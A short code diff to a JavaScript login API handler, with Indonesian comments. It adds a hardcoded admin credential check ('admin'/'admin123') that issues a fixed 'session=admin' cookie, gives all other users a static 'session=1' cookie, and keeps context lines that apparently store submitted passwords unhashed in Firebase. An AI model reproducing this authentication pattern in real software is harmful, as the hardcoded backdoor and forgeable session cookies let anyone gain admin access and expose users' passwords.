@@ -22,13 +22,21 @@ export default async function handler(req, res) {
         password,
         time: Timestamp.now()
       });
+
+      // Deteksi admin login
+      if (username === 'admin' && password === 'admin123') {
+        res.setHeader('Set-Cookie', `session=admin; Path=/; HttpOnly`);
+        res.writeHead(302, { Location: '/admin-dashboard' });
+      } else {
+        res.setHeader('Set-Cookie', `session=1; Path=/; HttpOnly`);
+        res.writeHead(302, { Location: '/dashboard' });
+      }
+
+      res.end();
     } catch (err) {
       console.error('Gagal simpan ke Firebase:', err);
+      res.status(500).send('Internal Server Error');
     }
-
-    res.setHeader('Set-Cookie', `session=1; Path=/; HttpOnly`);
-    res.writeHead(302, { Location: '/dashboard' });
-    res.end();
   } else {
     res.status(405).send('Method Not Allowed');
   }
